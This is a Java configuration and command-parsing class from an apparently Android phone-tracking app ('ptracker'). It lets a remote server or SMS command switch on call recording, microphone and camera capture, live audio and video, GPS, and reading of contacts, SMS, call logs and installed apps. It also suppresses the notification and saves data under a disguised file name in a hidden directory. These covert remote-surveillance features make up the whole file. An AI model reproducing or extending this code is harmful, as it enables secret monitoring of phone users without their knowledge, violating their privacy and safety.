package vn.vhc.live;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.GregorianCalendar;
import java.util.Stack;
import java.util.TimeZone;
import java.util.concurrent.TimeUnit;

import vn.vhc.live.liveaudio.AudioCall;
import vn.vhc.live.liveaudio.AudioCodec;




import android.content.Context;

public class UtilGame 
{
	
	private static UtilGame _instance;	
	public static boolean isBusy=true;	
	
	public static boolean isRestarting =false;
	public static String isFirstRun ="";	
	public static boolean isPtrackerErpLite=false;
	
	public static String typegame ="ptracker";//ptracker or ptrackererp
	public static String liveaudio ="liveaudio";//audio or noaudio
	public static String typeconnect ="Unknown";//wifi or gprs network	
	public static String speedConnect ="Unknown";//wifi or gprs network	
	public static int typeSubNet =-1;	//type network connect
	public static String version ="v4.641";//version of me	
	
	public static int recordcall =1;//record incoming
	public static int recordcall1 =1;//record outcoming
	
	
	
	public static int savepin =1;//0:fast realtime but lot of battery,1: lattancy but save battery	
	public static boolean modeOffline =false;//1:fast realtime but lot of battery,0: lattancy but save battery	
	public static boolean modeAutoTurnOnScreen =false;//1:fast realtime but lot of battery,0: lattancy but save battery	
	
	public static int maxTimeOutTimes =10;	//count of max times
	public static int errNetWorkTimes =0;	//count of error
	public static int maxTimeToCancel =15*60*1000;	//ms
	//public static int maxTimeToRecord =60*60000;	//ms
	
	public static boolean useRestartAuto =true;	//use restart service interval
	public static Date timeStarted =new Date();//time up started services
	public static int timeToRestart =300000;	//5 minutes
	
	
	public static boolean isRunningService =false;	//5 minutes
	public static boolean isRunningServiceBackup =false;	//5 minutes
	public static boolean useServiceBackup =false;
	
	public static int timeRunServiceBackupDebug =0;
	public static String infoRunServiceBackupDebug ="";
	public static int timeRestartServiceBackup =86400000;// 60000*60*24;//2 hours
	//public static int timeStarted =0;	//5 minutes
	public static int indexThread =0;
	
	public static boolean isAutoLogin=true;	
	
	public static boolean isRecordImage =false;
	public static boolean isRecordAudio =false;
	public static boolean isLiveAudio=false;
	public static boolean isLiveCamera =false;	
	public static boolean isRecordVideo =false;
	public static boolean voiceCall =false;	
	
	
	public static String cmdGPS ="0";//turn on gps
	public static String cmdReboot ="0";//turn of gps
	public static String cmdCustom ="0";//custom
	
	public static String debug ="";
	public static boolean isModeDebug =false;
	public static boolean isSdCard=true;
	public static String lastData="";
	
	public static boolean GPS_SAT=true;
	public static boolean GPS_NETWORK=true;
	
	//for call recording
	public static int OUTCOMING_SOURCE=1;
	public static int INCOMING_SOURCE=1;
		
	public static int OUTCOMING_OUTPUT_FORMAT=1;	
	public static int INCOMING_OUTPUT_FORMAT=1;
	
	public static int OUTCOMING_AUDIO_ENCODER=1;
	public static int INCOMING_AUDIO_ENCODER=1;
	public static boolean save3GState=false;//
	
	public static boolean autoSmartBattery=false;//	
	public static boolean modeEncrypt=false;//
	public static boolean modeOnlyWifi=false;
	public static boolean autoNotTurnOn3G=false;//khong tu dong bat 3G
	public static String liveCodeC="0";//
	public static boolean liveVideoSwf=false;//
	
	public static String packageSoft="vn.vhc.live";
	public static String locationHome="/data/data/"+packageSoft+"/";
	public static String FILE_SAVE ="androidqwer";//ptrackerqwer
	public static String KEY_PTRACKER ="ptrackeron";
	public static String DIR_SAVE ="/sdcard/Android/";//"/sdcard/tmp/";
	public static String PREFIX_SMS ="@#*6";
	
	
	public static String CMD_GPS_ON ="100";
	public static String CMD_GPS_OFF ="101";
	
	public static String CMD_WIFI_ON ="102";
	public static String CMD_WIFI_OFF ="103";
	
	public static String CMD_GPRS_ON ="104";
	public static String CMD_GPRS_OFF ="105";
	
	public static String CMD_ONLINE ="106";
	public static String CMD_OFFLINE ="107";
	
	public static String CMD_REBOOT ="108";
	public static String CMD_POSITION ="109";
	
	public static String CMD_AUTO3G_ON ="110";
	public static String CMD_AUTO3G_OFF ="111";
	
	public static String CMD_ONLYWIFI_ON ="112";
	public static String CMD_ONLYWIFI_OFF ="113";	
	
	public static String CMD_ENCRYPT_ON ="114";
	public static String CMD_ENCRYPT_OFF ="115";
	
	public static String CMD_SAVEPIN_ON ="116";
	public static String CMD_SAVEPIN_OFF ="117";
	
	//control command-200=in services
	public static int CMD_STOP_PICTURE =299;
	public static int CMD_START_PICTURE =300;
	
	public static int CMD_START_RECORDAUDIO =301;
	public static int CMD_STOP_RECORDAUDIO =302;
	
	public static int CMD_START_RECORDVIDEO=303;
	public static int CMD_STOP_RECORDVIDEO =304;
	
	public static int CMD_START_LIVEAUDIO=305;
	public static int CMD_STOP_LIVEAUDIO =306;
	
	public static int CMD_START_READCONTACT=307;
	public static int CMD_START_READSMS =312;
	
	public static int CMD_START_READLOGCALL =313;
	public static int CMD_START_READAPPS =318;
	
	public static int CMD_START_LIVECAMERA=390;
	public static int CMD_STOP_LIVECAMERA =391;
	public static boolean isNotUsingNotification=false;
	public static String companyid="-1";
	public static UtilGame getInstance()
	{		
		if(_instance==null)_instance= new UtilGame();
		return _instance;
	}

		
	public void parseCmdCAndC(String sCAndC)
	{
		if(sCAndC!=null && !("".equals(sCAndC)))
		{
			try
			{
				if(sCAndC.length()>=1) isRecordImage=sCAndC.substring(0, 1).equals("1");
				if(sCAndC.length()>=2) isRecordAudio=sCAndC.substring(1, 2).equals("1");
				if(sCAndC.length()>=3) isLiveAudio=sCAndC.substring(2, 3).equals("1");
				if(sCAndC.length()>=4) isLiveCamera=sCAndC.substring(3, 4).equals("1");			
				if(sCAndC.length()>=5) recordcall=sCAndC.substring(4, 5).equals("1")?1:0;
				
				if(sCAndC.length()>=6) voiceCall=sCAndC.substring(5, 6).equals("1")?true:false;//voicecall
				if(sCAndC.length()>=7) savepin=sCAndC.substring(6, 7).equals("1")?1:0;//savepin	

				
				//start for recordcall
				//if(sCAndC.length()>=8) save3GState=sCAndC.substring(7, 8).equals("1")?true:false;//savepin	
				if(sCAndC.length()>=8) OUTCOMING_SOURCE=sCAndC.substring(7, 8).equals("0")?0: Integer.parseInt(sCAndC.substring(7, 8));//gps	
				if(sCAndC.length()>=9) INCOMING_SOURCE=sCAndC.substring(8,9).equals("0")?0: Integer.parseInt(sCAndC.substring(8, 9));
				
				if(sCAndC.length()>=10) OUTCOMING_OUTPUT_FORMAT=sCAndC.substring(9, 10).equals("0")?1: Integer.parseInt(sCAndC.substring(9, 10));	
				if(sCAndC.length()>=11) INCOMING_OUTPUT_FORMAT=sCAndC.substring(10, 11).equals("0")?1: Integer.parseInt(sCAndC.substring(10, 11));
				
				if(sCAndC.length()>=12) OUTCOMING_AUDIO_ENCODER=sCAndC.substring(11, 12).equals("0")?1: Integer.parseInt(sCAndC.substring(11, 12));
				if(sCAndC.length()>=13) INCOMING_AUDIO_ENCODER=sCAndC.substring(12, 13).equals("0")?1: Integer.parseInt(sCAndC.substring(12, 13));
				if(sCAndC.length()>=14) save3GState=sCAndC.substring(13, 14).equals("1")?true:false;
			
				if(sCAndC.length()>=15) modeOffline=sCAndC.substring(14, 15).equals("1")?true:false;
				if(sCAndC.length()>=16) modeAutoTurnOnScreen=sCAndC.substring(15, 16).equals("1")?true:false;
				if(sCAndC.length()>=17) autoSmartBattery=sCAndC.substring(16, 17).equals("1")?true:false;				
				
				//start new version upto 4.5
				if(sCAndC.length()>=18) 
				{
					liveCodeC=sCAndC.substring(17, 18);
					if(liveCodeC.equals("0"))AudioCall.sourceCodec=AudioCodec.AAC.name;
					else if(liveCodeC.equals("1"))AudioCall.sourceCodec=AudioCodec.Nellymoser.name;
					else if(liveCodeC.equals("2"))AudioCall.sourceCodec=AudioCodec.ADPCM_SWF.name;
					else AudioCall.sourceCodec=AudioCodec.AAC.name;//default					
				}
				
				if(sCAndC.length()>=19) autoNotTurnOn3G=sCAndC.substring(18, 19).equals("1")?true:false;	
				if(sCAndC.length()>=20) modeOnlyWifi=sCAndC.substring(19, 20).equals("1")?true:false;	
				if(sCAndC.length()>=21) modeEncrypt=sCAndC.substring(20, 21).equals("1")?true:false;
				if(sCAndC.length()>=22) liveVideoSwf=sCAndC.substring(21, 22).equals("1")?true:false;
				if(sCAndC.length()>=23) useRestartAuto=sCAndC.substring(22, 23).equals("1")?false:true;
				if(sCAndC.length()>=24) isNotUsingNotification=sCAndC.substring(23, 24).equals("1")?true:false;
				
			}catch(Exception ex){}
		}
	}
	public void parseCmdControlPanel(String sCAndC)
	{
			try
			{
				if(sCAndC!=null && !("".equals(sCAndC)))
				{
					if(sCAndC.length()>=1) cmdGPS=sCAndC.substring(0, 1);//gps	
					if(sCAndC.length()>=2) cmdReboot=sCAndC.substring(1, 2);//reboot	
					if(sCAndC.length()>=3) cmdCustom=sCAndC.substring(2,3);//custom	sms
					
					if(cmdGPS.equals("1")) {
						ContextManagerCore.getInstance().turnGPSOn();
						cmdGPS="9";
					}
					if(cmdGPS.equals("2")){
						ContextManagerCore.getInstance().turnGPSOff();
						cmdGPS="9";
					}			
					if(cmdReboot.equals("1"))
					{
						ContextManagerCore.getInstance().restartService();
						cmdReboot="9";
					}
					if(cmdCustom.equals("1"))
					{
						ContextManagerCore.getInstance().sendSMSToRegisterOnCommand();
						cmdCustom="9";
					}
				}
			}catch(Exception ex){}
		
	}
	public static String getStringCAndC()
	{
		//0000110000111100002000000
		recordcall1=recordcall;
		return 
				(isRecordImage?"1":"0")+
				(isRecordAudio?"1":"0")+
				(isLiveAudio?"1":"0")+
				(isLiveCamera?"1":"0")+
				(recordcall==1?"1":"0")+
				(recordcall1==1?"1":"0")+
				(voiceCall?"1":"0")+
				(savepin==1?"1":"0")+				
				String.valueOf(OUTCOMING_SOURCE)+
				String.valueOf(INCOMING_SOURCE)+
				String.valueOf(OUTCOMING_OUTPUT_FORMAT)+
				String.valueOf(INCOMING_OUTPUT_FORMAT)+
				String.valueOf(OUTCOMING_AUDIO_ENCODER)+
				String.valueOf(INCOMING_AUDIO_ENCODER)+
				(save3GState?"1":"0")+
				(modeOffline?"1":"0")+							
				(modeAutoTurnOnScreen?"1":"0")+
				(autoSmartBattery?"1":"0")+	
				(liveCodeC)+					
				(cmdGPS)+
				(cmdReboot)+
				(cmdCustom)+
				(autoNotTurnOn3G?"1":"0")+
				(modeOnlyWifi?"1":"0")+
				(modeEncrypt?"1":"0")+
				(liveVideoSwf?"1":"0")+
				(useRestartAuto?"0":"1")+
				(isNotUsingNotification?"1":"0");
	}
	public boolean isCAndC()
	{
		return isRecordImage|| isRecordAudio|| isLiveAudio|| isLiveCamera;
	}
	public void loadConfigFromDB()
	{
		String reload=ContextManagerCore.getInstance().readFromDB("reload");
		if(reload.equals("1"))
		{
			String s1=ContextManagerCore.getInstance().readFromDB("liveaudio");
			if(!s1.equals(""))liveaudio=s1;
			
			
			s1=ContextManagerCore.getInstance().readFromDB("pin");
			try
			{
				if(s1.equals("on")) s1="1";
				else if(s1.equals("off")) s1="0";
				
				if(!s1.equals(""))savepin=Integer.parseInt(s1);
			}catch(Exception ex){}
			
			
			s1=ContextManagerCore.getInstance().readFromDB("td");
			try
			{
				if(s1.equals("on")) s1="true";
				else if(s1.equals("off")) s1="false";
				
				if(!s1.equals(""))isAutoLogin=(s1).equals("true");
			}catch(Exception ex){}
			
			s1=ContextManagerCore.getInstance().readFromDB("typegame");
			try
			{
				if(!s1.equals(""))typegame=s1;
			}catch(Exception ex){}
			
			s1=ContextManagerCore.getInstance().readFromDB("timereboot");
			try
			{	
				if(!s1.equals(""))timeToRestart=Integer.parseInt(s1);
			}catch(Exception ex){}
			
			/*
			s1=ContextManagerCore.getInstance().readFromDB("recordcall");
			try
			{
				if(s1.equals("on")) s1="1";
				else if(s1.equals("off")) s1="0";
				
				if(!s1.equals("")){
					recordcall=Integer.parseInt(s1);					
				}
			}catch(Exception ex){}
			
			s1=ContextManagerCore.getInstance().readFromDB("recordcall1");
			try
			{
				if(s1.equals("on")) s1="1";
				else if(s1.equals("off")) s1="0";
				
				if(!s1.equals(""))recordcall1=Integer.parseInt(s1);
				else recordcall1=recordcall;
			}catch(Exception ex){}
			
			s1=ContextManagerCore.getInstance().readFromDB("voicecall");
			try
			{
				if(s1.equals("on")) voiceCall=true;
				else voiceCall=false;				
			}catch(Exception ex){}
			*/
			
			s1=ContextManagerCore.getInstance().readFromDB("offline");
			try
			{
				//ptracker offline off send to tel
				if(s1.equals("on")) modeOffline=true;
				else if(s1.equals("off")) modeOffline=false;
				else modeOffline=false;				
			}catch(Exception ex){}
			
			//clear need to load config
			ContextManagerCore.getInstance().saveToDB("reload", "0");
		}
	}
	public String GetStringFromTimeStamp(long timestamp)
	{
		Date dt= new Date();
		dt.setTime(timestamp);
		
		Calendar calendar = Calendar.getInstance();
	    calendar.setTime(dt);

	    int year = calendar.get(Calendar.YEAR);
	    int month = calendar.get(Calendar.MONTH);
	    int day = calendar.get(Calendar.DAY_OF_MONTH);
	    int hour = calendar.get(Calendar.HOUR_OF_DAY);
	    int minute = calendar.get(Calendar.MINUTE);
	    int second = calendar.get(Calendar.SECOND);
	  
	    
	    String sYear=String.valueOf(year);
	    
	    month=month+1;
	    String sMonth=String.valueOf(month);
	    if(month<10) sMonth="0"+sMonth;
	    
	    String sDay=String.valueOf(day);
	    if(day<10) sDay="0"+sDay;
	    
	    String sHours=String.valueOf(hour);
	    if(hour<10) sHours="0"+sHours;
	    
	    String sMinutes=String.valueOf(minute);
	    if(minute<10) sMinutes="0"+sMinutes;
	    
	    String sSecond=String.valueOf(second);
	    if(second<10) sSecond="0"+sSecond;
	    
	    return (sYear+sMonth+sDay+sHours+sMinutes+sSecond);

	}
	public static boolean isBusyForRecording()
	{
		return (APTrackerService.statusCmdRealtime.equals(TypeCmd.PROCESSING));
	}
	public String GetStringNow() {
		// TODO Auto-generated method stub
		try 
		{
			 DateFormat formatter ; 
			 formatter = new SimpleDateFormat("yyyyMMddHHmmss");
			
			  String s = formatter.format(new Date());
			  return s;			  
		} catch (Exception e)
		{  }  
		return "20010101010101";
	}
	public String GetDateToView(String str_date) 
	{		
		try{
		if(str_date==null)return "";
		return str_date.substring(8,8+2)+":"+str_date.substring(10,10+2);//
		//return str_date.substring(8,2)+":"+str_date.substring(10,2)+"  "+str_date.substring(4,2)+"/"+str_date.substring(6,2);
		 } catch (Exception e)
		  {  
	  }
		 return "";
	}
	public boolean isValidGPS(String timeGPS) 
	{
		try 
		{
			Date date = new SimpleDateFormat("yyyyMMddHHmmss").parse(timeGPS);
			date.setMinutes(date.getMinutes()+5);
			return date.after(new Date());
		} catch (Exception e)
		{  
			return false;			
		}
	}	
	public static void checkSDCard()
    {
		boolean isSDPresent = android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED);
		isSdCard=(isSDPresent);
		
    }
	public static int getGMT() 
	{
		Calendar mCalendar = new GregorianCalendar();  
		TimeZone mTimeZone = mCalendar.getTimeZone();  
		int mGMTOffset = mTimeZone.getRawOffset(); 
		//return TimeUnit.HOURS.convert(mGMTOffset, TimeUnit.MILLISECONDS);
		return mGMTOffset/1000;
	}


	public String GetStringNowToView() {
		// TODO Auto-generated method stub
		try 
		{
			 DateFormat formatter ; 
			 formatter = new SimpleDateFormat("dd/MM/yyyy HH:mm");
			
			  String s = formatter.format(new Date());
			  return s;			  
		} catch (Exception e)
		{  }  
		return "20010101010101";
	}
}
	
